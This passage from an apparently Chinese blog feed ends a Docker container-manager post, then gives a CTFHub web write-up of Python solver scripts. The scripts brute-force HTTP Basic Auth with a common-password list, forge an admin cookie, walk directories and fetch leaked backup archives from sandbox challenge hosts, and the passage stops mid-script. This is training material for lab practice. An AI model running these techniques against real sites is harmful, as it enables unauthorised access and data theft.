class="language-bash">输入您想要进行的操作的序号 <span class="token operator">>></span> 2        Now,the instances not running are list as follows:                实例编号        容器的ID                容器的名字              容器的IP                   1            7ffb7ab9357b            ctfd_ctfd_1             未运行,无IP                   2            5647bf40afb6            ctfd_cache_1            未运行,无IP                   3            9850433d5ea5            ctfd_db_1               未运行,无IP请输入您想要启动的docker实例编号<span class="token punctuation">(</span>a all<span class="token punctuation">)</span> <span class="token operator">>></span> 1start 7ffb7ab9357b successful<span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span> Docker managemet program by valecalida <span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;</span>                1 <span class="token operator">>></span> 查看当前docker的运行状态                2 <span class="token operator">>></span> 开启指定<span class="token punctuation">(</span>全部<span class="token punctuation">)</span>容器                3 <span class="token operator">>></span> 关闭指定<span class="token punctuation">(</span>全部<span class="token punctuation">)</span>容器                q <span class="token operator">>></span> 退出程序<span class="token punctuation">(</span>q<span class="token punctuation">)</span>输入您想要进行的操作的序号 <span class="token operator">>></span> 1        Now,the instances not running are list as follows:                实例编号        容器的ID                容器的名字              容器的IP                   1            5647bf40afb6            ctfd_cache_1            未运行,无IP                   2            9850433d5ea5            ctfd_db_1               未运行,无IP        Now,the instances running are list as follows:                实例编号        容器的ID                容器的名字      容器的IP        容器的端口                   1            80a350cee15c            wordpress       172.18.0.3         80                   2            26d6109587e8              mysql         172.18.0.2        3306                   3            7ffb7ab9357b            ctfd_ctfd_1     172.20.0.2        8000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、关闭指定容器"><a href="#3、关闭指定容器" class="headerlink" title="3、关闭指定容器"></a>3、关闭指定容器</h3><pre class="line-numbers language-bash"><code class="language-bash">输入您想要进行的操作的序号 <span class="token operator">>></span> 3        Now,the instances running are list as follows:                实例编号        容器的ID                容器的名字      容器的IP        容器的端口                   1            80a350cee15c            wordpress       172.18.0.3         80                   2            26d6109587e8              mysql         172.18.0.2        3306                   3            7ffb7ab9357b            ctfd_ctfd_1     172.20.0.2        8000请输入您想要关闭的docker实例编号<span class="token punctuation">(</span>a all<span class="token punctuation">)</span> <span class="token operator">>></span> 3stop 7ffb7ab9357b successful<span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span> Docker managemet program by valecalida <span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;</span>                1 <span class="token operator">>></span> 查看当前docker的运行状态                2 <span class="token operator">>></span> 开启指定<span class="token punctuation">(</span>全部<span class="token punctuation">)</span>容器                3 <span class="token operator">>></span> 关闭指定<span class="token punctuation">(</span>全部<span class="token punctuation">)</span>容器                q <span class="token operator">>></span> 退出程序<span class="token punctuation">(</span>q<span class="token punctuation">)</span>输入您想要进行的操作的序号 <span class="token operator">>></span> 1        Now,the instances not running are list as follows:                实例编号        容器的ID                容器的名字              容器的IP                   1            7ffb7ab9357b            ctfd_ctfd_1             未运行,无IP                   2            5647bf40afb6            ctfd_cache_1            未运行,无IP                   3            9850433d5ea5            ctfd_db_1               未运行,无IP        Now,the instances running are list as follows:                实例编号        容器的ID                容器的名字      容器的IP        容器的端口                   1            80a350cee15c            wordpress       172.18.0.3         80                   2            26d6109587e8              mysql         172.18.0.2        3306<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4、退出程序"><a href="#4、退出程序" class="headerlink" title="4、退出程序"></a>4、退出程序</h3><pre class="line-numbers language-bash"><code class="language-bash">输入您想要进行的操作的序号 <span class="token operator">>></span> q        程序将在一秒后自动退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Error：使用Markdown展示跟本地实际命令执行的效果有所差别，在Linux主机上测试对齐、格式都正常"><a href="#Error：使用Markdown展示跟本地实际命令执行的效果有所差别，在Linux主机上测试对齐、格式都正常" class="headerlink" title="Error：使用Markdown展示跟本地实际命令执行的效果有所差别，在Linux主机上测试对齐、格式都正常"></a>Error：使用Markdown展示跟本地实际命令执行的效果有所差别，在Linux主机上测试对齐、格式都正常</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHUB_Web_Partial_WriteUp</title>
      <link href="/2020/04/08/ctfhub-web-partial-writeup/"/>
      <url>/2020/04/08/ctfhub-web-partial-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="Web–WriteUp"><a href="#Web–WriteUp" class="headerlink" title="Web–WriteUp"></a>Web–WriteUp</h1><h2 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h2><h3 id="一、HTTP协议"><a href="#一、HTTP协议" class="headerlink" title="一、HTTP协议"></a>一、HTTP协议</h3><h4 id="1、请求方式"><a href="#1、请求方式" class="headerlink" title="1、请求方式"></a>1、请求方式</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/3/19 19:59</span><span class="token keyword">from</span> urllib <span class="token keyword">import</span> request<span class="token keyword">import</span> re<span class="token triple-quoted-string string">"""    HTTP Method is GET    Use CTF**B Method, I will give you flag.    Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php."""</span>rr <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\bctfhub{.*}'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://challenge-c2631c2870dc91e1.sandbox.ctfhub.com:10080/index.php"</span>req <span class="token operator">=</span> request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"CTFHUB"</span><span class="token punctuation">)</span>res <span class="token operator">=</span> request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rr<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、基础认证"><a href="#2、基础认证" class="headerlink" title="2、基础认证"></a>2、基础认证</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/3/19 19:53</span><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> HTTPBasicAuthHandler<span class="token punctuation">,</span> build_opener<span class="token punctuation">,</span> HTTPPasswordMgrWithDefaultRealm<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>error <span class="token keyword">import</span> URLErrorusername <span class="token operator">=</span> <span class="token string">'admin'</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'10_million_password_list_top_100.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://challenge-b14d74b2bbccc186.sandbox.ctfhub.com:10080/flag.html"</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    password <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    instance <span class="token operator">=</span> HTTPPasswordMgrWithDefaultRealm<span class="token punctuation">(</span><span class="token punctuation">)</span>    instance<span class="token punctuation">.</span>add_password<span class="token punctuation">(</span>None<span class="token punctuation">,</span> url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    auth_handler <span class="token operator">=</span> HTTPBasicAuthHandler<span class="token punctuation">(</span>instance<span class="token punctuation">)</span>    opener <span class="token operator">=</span> build_opener<span class="token punctuation">(</span>auth_handler<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> opener<span class="token punctuation">.</span>open<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        html <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"用户名：admin 密码：%s"</span> <span class="token operator">%</span> password<span class="token punctuation">,</span> <span class="token string">"是正确答案"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag为："</span><span class="token punctuation">,</span> html<span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span> URLError <span class="token keyword">as</span> e <span class="token punctuation">:</span>        <span class="token keyword">continue</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、响应包源码"><a href="#3、响应包源码" class="headerlink" title="3、响应包源码"></a>3、响应包源码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/3/19 20:56</span><span class="token keyword">import</span> re<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestrr <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\bctfhub{.*}'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://challenge-226bf952c446eb7c.sandbox.ctfhub.com:10080/"</span>res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rr<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4、cookie"><a href="#4、cookie" class="headerlink" title="4、cookie"></a>4、cookie</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/3/19 20:09</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requesturl <span class="token operator">=</span> <span class="token string">"http://challenge-dd1412b01a02d5dd.sandbox.ctfhub.com:10080/"</span>header <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"admin=1"</span><span class="token punctuation">}</span>req <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"GET"</span><span class="token punctuation">)</span>res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5、302跳转"><a href="#5、302跳转" class="headerlink" title="5、302跳转"></a>5、302跳转</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># -- author : valecalida --</span><span class="token comment" spellcheck="true"># edit_time: 2020/3/20 上午3:34</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://challenge-061acc63c590e9b4.sandbox.ctfhub.com:10080/index.php"</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="一、信息泄露"><a href="#一、信息泄露" class="headerlink" title="一、信息泄露"></a>一、信息泄露</h2><h3 id="1、目录遍历"><a href="#1、目录遍历" class="headerlink" title="1、目录遍历"></a>1、目录遍历</h3><p>这里通过观察目录的情况，发现目录都是 <code>/flag_in_here/1/%d</code> 的样式，于是构造脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/4/5 15:31</span><span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException<span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> sys<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num_list <span class="token operator">=</span> <span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    url_1 <span class="token operator">=</span> <span class="token string">"http://challenge-6ccebf9522010cca.sandbox.ctfhub.com:10080/flag_in_here/"</span>    url_2 <span class="token operator">=</span> <span class="token string">"/flag.txt"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> num_list<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> num_list<span class="token punctuation">:</span>            header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>            url <span class="token operator">=</span> url_1 <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> url_2            <span class="token keyword">try</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>            <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag_in_here/1/%d下没有flag.txt这个文件"</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"^ctfhub{.*}"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"当访问%s时获取答案：\n\t[+] %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>url<span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>                    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到的结果是</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>1987f2dcecfe6cc28241015c225ce28c33aef1f7<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2、PHPINFO"><a href="#2、PHPINFO" class="headerlink" title="2、PHPINFO"></a>2、PHPINFO</h3><p>由于题目提示页面中将会直接出现flag，所以直接构建脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python3<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/4/5 15:52</span><span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException<span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> sys<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>    <span class="token punctuation">]</span>    <span class="token keyword">return</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    rr <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\bctfhub{.*}'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    url <span class="token operator">=</span> <span class="token string">"http://challenge-a0372dd0c18f0f3c.sandbox.ctfhub.com:10080/"</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        link <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;a href=\"(.*)\" class.*"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"访问的时候出现了问题"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        new_url <span class="token operator">=</span> url <span class="token operator">+</span> link<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>new_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;tr.*>(ctfhub{.*}) &lt;.*"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>            <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到的结果是</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>1c7fbb0f603c9e003a7cdec1a09b74fa8e95ea57<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3、备份文件下载"><a href="#3、备份文件下载" class="headerlink" title="3、备份文件下载"></a>3、备份文件下载</h3><h4 id="3-1、网站源码"><a href="#3-1、网站源码" class="headerlink" title="3.1、网站源码"></a>3.1、网站源码</h4><p>​        当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/4/5 16:12</span><span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException<span class="token keyword">import</span> requests<span class="token keyword">import</span> zipfile<span class="token keyword">import</span> random<span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>    <span class="token punctuation">]</span>    <span class="token keyword">return</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">unzip_file</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    zip_src <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\\"</span> <span class="token operator">+</span> name    <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'unzip_folder'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'unzip_folder'</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>is_zipfile<span class="token punctuation">(</span>zip_src<span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">:</span>        fz <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>zip_src<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> file <span class="token keyword">in</span> fz<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            fz<span class="token punctuation">.</span>extract<span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token string">"unzip_folder"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 解压%s到文件夹%s完成"</span> <span class="token operator">%</span> <span class="token 